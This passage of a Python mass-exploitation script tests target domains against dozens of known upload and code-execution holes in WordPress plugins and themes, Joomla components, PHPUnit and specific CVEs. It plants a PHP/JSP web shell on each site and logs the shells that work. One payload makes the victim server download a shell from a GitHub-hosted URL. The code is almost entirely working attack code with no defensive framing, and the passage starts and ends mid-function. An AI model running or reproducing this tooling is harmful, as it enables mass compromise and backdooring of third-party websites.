			print(f"{blue}|- {white}http://{url} {white}| {yellow}Array Files -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Array Files -->> {red}Not Vuln !")
	except:pass
 
def dfac(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/adminside/server/php/')
		c = ('http://' + url+'/images/block/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Design Factory -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Design Factory -->> {red}Not Vuln !")
	except:pass
 
def vephoto(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/vehiculo_photos/server/php/')
		c = ('http://' + url+'/vehiculo_photos/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Vehiculo Photos -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Vehiculo Photos -->> {red}Not Vuln !")
	except:pass
 
def tpl(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/tpl/plugins/upload9.1.0/server/php/')
		c = ('http://' + url+'/tpl/plugins/upload9.1.0/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Tpl File Upload -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Tpl File Upload -->> {red}Not Vuln !")
	except:pass
 
def filecms(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/public/upload_nhieuanh/server/php/_index.php')
		c = ('http://' + url+'/public/upload_nhieuanh/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}FileCMS -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}FileCMS -->> {red}Not Vuln !")
	except:pass
 
def keybase(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/web/image/upload.php')
		c = ('http://' + url+'/web/image/Images/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}KeyBase -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}KeyBase -->> {red}Not Vuln !")
	except:pass
 
def andr(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/AndroidFileUpload/fileUpload.php')
		c = ('http://' + url+'/AndroidFileUpload/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Android File Upload -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Android File Upload -->> {red}Not Vuln !")
	except:pass
 
def revsliderEX(domain):
    try:
        domain = ''.join(domain)
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        ua = {'User-Agent': UserAgent().random}
        Exploit = 'https://' + domain + '/wp-admin/admin-ajax.php'
        data = {'action': 'revslider_ajax_action','client_action': 'update_plugin'}
        FileShell = {'update_file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.zip', 'rb')}
        CheckRevslider = requests.get('http://' + domain, timeout=10, headers=ua, verify=False)
        if '/wp-content/plugins/revslider/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev = requests.get('http://' + domain + '/wp-content/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass #print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {red}Failed !")

        elif '/wp-content/themes/Avada/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30,verify=False)
            CheckRev1 = requests.get('http://' + domain + '/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua,verify=False)
            if 'AXVTECH' in CheckRev1.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/striking_r/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev2 = requests.get('http://' + domain + '/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev2.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/IncredibleWP/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev3 = requests.get('http://' + domain + '/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev3.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/ultimatum/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev4 = requests.get('http://' + domain + '/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev4.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/medicate/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev5 = requests.get('http://' + domain + '/wp-content/themes/medicate/script/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev5.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/medicate/script/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/centum/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev6 = requests.get('http://' + domain + '/wp-content/themes/centum/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev6.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/centum/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/beach_apollo/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev7 = requests.get('http://' + domain + '/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev7.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/cuckootap/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev8 = requests.get('http://' + domain + '/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev8.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/pindol/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev9 = requests.get('http://' + domain + '/wp-content/themes/pindol/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev9.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/pindol/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/designplus/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev10 = requests.get('http://' + domain + '/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev10.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/rarebird/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev11 = requests.get('http://' + domain + '/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev11.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass

        elif '/wp-content/themes/Avada/' in str(CheckRevslider.text):
            requests.post(Exploit, files=FileShell, data=data, headers=ua, timeout=30, verify=False)
            CheckRev12 = requests.get('http://' + domain + '/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/axv.php', timeout=10, headers=ua, verify=False)
            if 'AXVTECH' in CheckRev12.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/axv.php\n")
            else:pass
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Revslider -->> {red}Not Vuln !")
    except:pass
    
def exPP(domain):
    try:
        domain = ''.join(domain)
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        simogeo(domain)
        array(domain)
        dfac(domain)
        vephoto(domain)
        tpl(domain)
        filecms(domain)
        keybase(domain)
        andr(domain)
        Columnad2(domain)
        Propagead2(domain)
        Vtemslide(domain)
        Realty(domain)
        Realty3(domain)
        Realty4(domain)
        Premeg(domain)
        Soof2(domain)
        Soof3(domain)
        Fupload(domain)
        jro2(domain)
        leo(domain)
        leo2(domain)
        leo3(domain)
        kitter(domain)
        add(domain)
        addthis(domain)
        attri3(domain)
        pkvert(domain)
        blocktesti(domain)
        Buddywp(domain)
        Buddywp2(domain)
        Cameleon(domain)
        Agritourismo(domain)
        Bulteno(domain)
        Oxygen(domain)
        Radial(domain)
        Rayoflight(domain)
        Reganto(domain)
        Bordeaux(domain)
        Rockstar(domain)
        Qualifire(domain)
        Ghost(domain)
        Anthology(domain)
        Kiddo(domain)
        Thisway(domain)
        UDesign(domain)
        Themify1(domain)
        Themify2(domain)
        Themify3(domain)
        Themify4(domain)
        Themify5(domain)
        Themify6(domain)
        Themify7(domain)
        Themify8(domain)
        Themify9(domain)
        Rightnow(domain)
        Coldfusion(domain)
        Magicfields(domain)
        Konzept(domain)
        Dancestudio(domain)
        Cubed(domain)
        Amplus(domain)
        Highlight(domain)
        Dandelion(domain)
        Satoshi(domain)
        Evolve(domain)
        Saico(domain)
        Synoptic(domain)
        Synoptic2(domain)
        Clockstone(domain)
        Andre(domain)
        Rarebird(domain)
        Pindol(domain)
        Cuckootap(domain)
        Beach_Apollo(domain)
        Centum(domain)
        Medicate(domain)
        Money(domain)
        Betheme(domain)
        Flipbook(domain)
        Wpstorecart(domain)
        Dzsvideogallery(domain)
        Adsmanager(domain)
        Wpproperty(domain)
        Wpproperty(domain)
        Userupload(domain)
        Assetmanager(domain)
        Cnhk(domain)
        Cstmbckgrn(domain)
        Workthe(domain)
        Workthe2(domain)
        Category(domain)
        Category2(domain)
        Assg(domain)
        Wpmobile(domain)
        Devtools2(domain)
        Genesis(domain)
        Acffrontend(domain)
        Picaphoto(domain)
        Formcraft(domain)
        Pitchprint(domain)
        Barclaycart(domain)
        Reflexgal(domain)
        Snetworking(domain)
        Phpevent(domain)
        Blasze(domain)
        Symposium(domain)
        Copysafe(domain)
        Wpuserf(domain)
        Mobilef(domain)
        Viralop(domain)
        Secfiles(domain)
        Checkout(domain)
        Purevision(domain)
        Multimedia(domain)
        Inmarketing(domain)
        Fileupload(domain)
        Logosware(domain)
        Dzszsound(domain)
        Iphone(domain)
        Levoslide(domain)
        Jssorup(domain)
        Lineexplo(domain)
        Pageline(domain)
        Mail(domain)
        Ajaxform(domain)
        Showbizapp(domain)
        wpInstall(domain)
        revsliderEX(domain)
        HeadwayTheme(domain)
        drupal7_1(domain)
        Cherryup(domain)
        LearnDashup(domain)
        Cherryup(domain)
        ReflexGallery(domain)
        Reflexupx(domain)
        Wpms(domain)
        WpDown(domain)
        Wp_p3d(domain)
        Phpunit(domain)
        Com_Xcloner(domain)
        CgiEx(domain)
        Wpmbl(domain)
        Jsr(domain)
        Sydney(domain)
        Wp_adning(domain)
        Zoom(domain)
        Ioptimizations(domain)
        Ioptimizations2(domain)
        Engine(domain)
        KasWara(domain)
        Apikey(domain)
        Cherry(domain)
        FormCraft(domain)
        Typehub(domain)
        Gallery(domain)
        Wpcargo(domain)
        WfPFILEMANAGER(domain)
        Gateway(domain)
        Gateway2(domain)
        Facil(domain)
        Sfu(domain)
        Levo(domain)
        Dain(domain)
        JexEx6(domain)
        JexEx7(domain)
        JexEx8(domain)
        JexEx3(domain)
        Blaze(domain)
        Catpro(domain)
        Powerzommer(domain)
        Sam(domain)
        Shp(domain)
        Inboundio(domain)
        SeCont(domain)
        Ffu(domain)
        Pec(domain)
        Avatars(domain)
        Fieldv(domain)
        Wg24(domain)
        Drupalajax(domain)
        Version7drupal(domain)
        Com_jbcatalog(domain)
        Adsmanager_shell(domain)
        Com_jdownloads(domain)
        Pure(domain)
        Wpshop(domain)
        Tevolution(domain)
        Sympo(domain)
        RightNow(domain)
        JexEx1(domain)
        JexEx2(domain)
        CombtPor(domain)
        JexEx4(domain)
        JexEx5(domain)
        Wysijaup(domain)
        DbConfig(domain)
        Com_jce(domain)
        WpEx1(domain)
        WpEx2(domain)
        WpEx3(domain)
        WpEx4(domain)
        WpEx5(domain)
        WpEx6(domain)
        WpEx7(domain)
        WpEx8(domain)
        WpEx9(domain)
        WpEx10(domain)
        WpEx11(domain)
        XD(domain)
        Exploit_CVE_2022_1388(domain)
        CVE_2022_26256(domain)
        Exploit_CVE_2021_21389(domain)
        jqueryfilerb(domain)
        jqueryfiler2(domain)
        jqueryfiler3(domain)
        jqueryfiler4(domain)
        jqueryfiler5(domain)
        jqueryfiler6(domain)
        jqueryfiler7(domain)
        jqueryfiler8(domain)
        jqueryfiler9(domain)
        jqueryfiler10(domain)
        jqueryfiler11(domain)
        jqueryfiler12(domain)
        jqueryfiler13(domain)
        jqueryfiler14(domain)
        jqueryfileup(domain)
        jqueryfileup2(domain)
        jqueryfileup3(domain)
        jqueryfileu4(domain)
        jqueryfileu5(domain)
        jqueryfileu6(domain)
        jqueryfileu7(domain)
        ua = {'User-Agent': UserAgent().random}

        appgrav = {'field_id': '3',
                   'form_id': '1',
                   'gform_unique_id': '../../../../',
                   'name': 'axv.php5'}
        Grav = {'file': open(index, 'rb')}
        try:
            requests.post(f"https://{domain}/?gf_page=upload", data=appgrav, files=Grav, headers=ua, timeout=20, verify=False)
            Gravlib = requests.get(f"http://{domain}/wp-content/_input_3_axv.php5", headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in Gravlib.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gravity-Bypass -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/wp-content/_input_3_axv.php5\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gravity-Bypass -->> {red}Not Vuln !")
        except:pass
        
        
        try:
            files294 = {"../../../../repository/deployment/server/webapps/authenticationendpoint/axv.jsp": open("modules/0KemYggJIdGfpf5i42FN/shells/axv.jsp", "rb")}
            req294 = requests.post(f"https://{domain}/fileupload/toolsAny", files=files294, headers=ua, timeout=20, verify=False)
            if req294.status_code == 200 and len(req294.content) > 0 and 'java' not in req294.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-29464 -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + "/authenticationendpoint/axv.jsp\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2022-29464 -->> {red}Not Vuln !")
        except:pass
        
        
        ## XD
        try:
            pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/AXxXV.php','w+'),file_get_contents('https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'));")
            rce_url(domain, pl)
            req_rce = requests.get("http://" + domain + '/AXxXV.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in req_rce.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}RCE-1 -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write("http://" + domain + '/AXxXV.php' + '\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}RCE-1 -->> {red}Failed Exploit !")
        except:pass

        # PHPUnit cloudflare
        try:
            vvascas = domain + '/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/build.xml'
            Expascas = '/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnascas = requests.get(f'http://{vvascas}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnascas.text):
                phpUnitExploit(domain, Expascas, 'PHPUnit cloudflare')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit cloudflare -->> {red}Not Vuln !")
        except:pass

        # PHPUnit contabileads
        try:
            vvcontabileads = domain + '/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/build.xml'
            Expcontabileads = '/wp-content/plugins/contabileads/integracoes/mautic/api-library/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulncontabileads = requests.get(f'http://{vvcontabileads}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulncontabileads.text):
                phpUnitExploit(domain, Expcontabileads, 'PHPUnit contabileads')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit contabileads -->> {red}Not Vuln !")
        except:pass

        # PHPUnit dzs-videogallery
        try:
            vvdzs = domain + '/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/build.xml'
            Expdzs = '/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulndzs = requests.get(f'http://{vvdzs}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulndzs.text):
                phpUnitExploit(domain, Expdzs, 'PHPUnit dzs-videogallery')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit dzs-videogallery -->> {red}Not Vuln !")
        except:pass

        # PHPUnit enfold-child
        try:
            vvenfold = domain + '/wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/build.xml'
            Expenfold = '/wp-content/themes/enfold-child/update_script/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnenfold = requests.get(f'http://{vvenfold}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnenfold.text):
                phpUnitExploit(domain, Expenfold, 'PHPUnit enfold-child')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit enfold-child -->> {red}Not Vuln !")
        except:pass

        # CVE-2023-5360
        try:
            cve5369 = requests.get(f"http://{domain}", headers=ua, timeout=7, verify=False).text
            if 'wpr-addons-js-js' in cve5369:
                nonce = get_nonce(cve5369)
                datacve5369 = {
                    'action': 'wpr_addons_upload_file',
                    'max_file_size': '0',
                    'allowed_file_types': 'ph$p',
                    'triggering_event': 'click',
                    'wpr_addons_nonce': nonce
                    }
                cve5369Files = {'uploaded_file': ('axvShells.ph$p', shell)}
                cve5369Post = requests.post(f"https://{domain}/wp-admin/admin-ajax.php", headers=ua, data=datacve5369, files=cve5369Files, timeout=20, verify=False)
                try:
                    host_res_json = cve5369Post.json()
                    if host_res_json["success"]:
                        cve5369Up = host_res_json["data"]["url"]
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2023-5360 -->> {green}Exploited !")
                        open('results/ShellsExploit.txt','a+').write(cve5369Up + '\n')
                    else:
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2023-5360 -->> {red}Failed Exploit !")
                except:pass
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CVE-2023-5360 -->> {red}Not Vuln !")
        except:pass

        # PHPUnit mm-plugin
        try:
            vvmmplugin = domain + '/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/build.xml'
            Expmmplugin = '/wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnmmplugin = requests.get(f'http://{vvmmplugin}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnmmplugin.text):
                phpUnitExploit(domain, Expmmplugin, 'PHPUnit mm-plugin')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit mm-plugin -->> {red}Not Vuln !")
        except:pass

        # PHPUnit prh-api
        try:
            vvprhapi = domain + '/wp-content/plugins/prh-api/vendor/phpunit/phpunit/build.xml'
            Expprhapi = '/wp-content/plugins/prh-api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnprhapi = requests.get(f'http://{vvprhapi}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnprhapi.text):
                phpUnitExploit(domain, Expprhapi, 'PHPUnit prh-api')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit prh-api -->> {red}Not Vuln !")
        except:pass
            # PHPUnit jekyll-exporter
        try:
            vvjekyll = domain + '/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/build.xml'
            Expjekyll = '/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnjekyll = requests.get(f'http://{vvjekyll}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnjekyll.text):
                phpUnitExploit(domain, Expjekyll, 'PHPUnit jekyll-exporter')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit jekyll-exporter -->> {red}Not Vuln !")
        except:pass
            # PHPUnit realia
        try:
            vvrealia = domain + '/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/build.xml'
            Exprealia = '/wp-content/plugins/realia/libraries/PayPal-PHP-SDK/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnrealia = requests.get(f'http://{vvrealia}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnrealia.text):
                phpUnitExploit(domain, Exprealia, 'PHPUnit realia')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit realia -->> {red}Not Vuln !")
        except:pass

        # PHPUnit  woocommerce-software
        try:
            vvwocsoft = domain + '/wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/build.xml'
            Expwocsoft = '/wp-content/plugins/woocommerce-software-license-manager/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            CheckVulnwocsoft = requests.get(f'http://{vvwocsoft}', timeout=10, headers=ua, verify=False)
            if 'taskname="phpunit"' in str(CheckVulnwocsoft.text):
                phpUnitExploit(domain, Expwocsoft, 'PHPUnit  woocommerce-software')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUnit  woocommerce-software -->> {red}Not Vuln !")
        except:pass
            
        # com_agora
        try:
            requests.post(f'https://{domain}/index.php?option=com_agora&task=upload?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
            Expcom_agora = requests.get('http://' + domain + '/components/com_agora/img/members/0/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcom_agora.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_agora -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/components/com_agora/img/members/0/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_agora -->> {red}Not Vuln !")
        except:pass

        # com_maian15
        try:
            requests.post(f'https://{domain}/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
            com_maian15 = requests.get('http://' + domain + '/administrator/components/com_maian15/charts/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(com_maian15.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_maian15 -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/administrator/components/com_maian15/charts/tmp-upload-images/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_maian15 -->> {red}Not Vuln !")
        except:pass

        # com_maianmedia
        try:
            requests.post(f'https://{domain}/administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
            Expcom_maianmedia = requests.get('http://' + domain + '/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcom_maianmedia.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_maianmedia -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_maianmedia -->> {red}Not Vuln !")
        except:pass

        # com_mtree
        try:
            requests.post(f'https://{domain}/components/com_mtree/upload.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False).text
            Expcom_mtree = requests.get('http://' + domain + '/components/com_mtree/img/listings/o/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcom_mtree.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_mtree -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/components/com_mtree/img/listings/o/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}com_mtree -->> {red}Not Vuln !")
        except:pass

        # mod_artuploader
        try:
            requests.post(f'https://{domain}/modules/mod_artuploader/upload.php?name=axv.php', data=shell, timeout=30, headers=ua, verify=False)
            Expcmod_artuploader = requests.get('http://' + domain + '/modules/mod_artuploader/axv.php', headers=ua, timeout=10, verify=False)
            if 'AXVTECH' in str(Expcmod_artuploader.text):
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_artuploader -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f'http://{domain}/modules/mod_artuploader/axv.php\n')
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}mod_artuploader -->> {red}Not Vuln !")
        except:pass

        # AIT CSV Import
        try:
            requests.post(f'https://{domain}/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php', files={"file":('axv.php',shell.encode(), "text/html")}, timeout=30, headers=ua, verify=False)
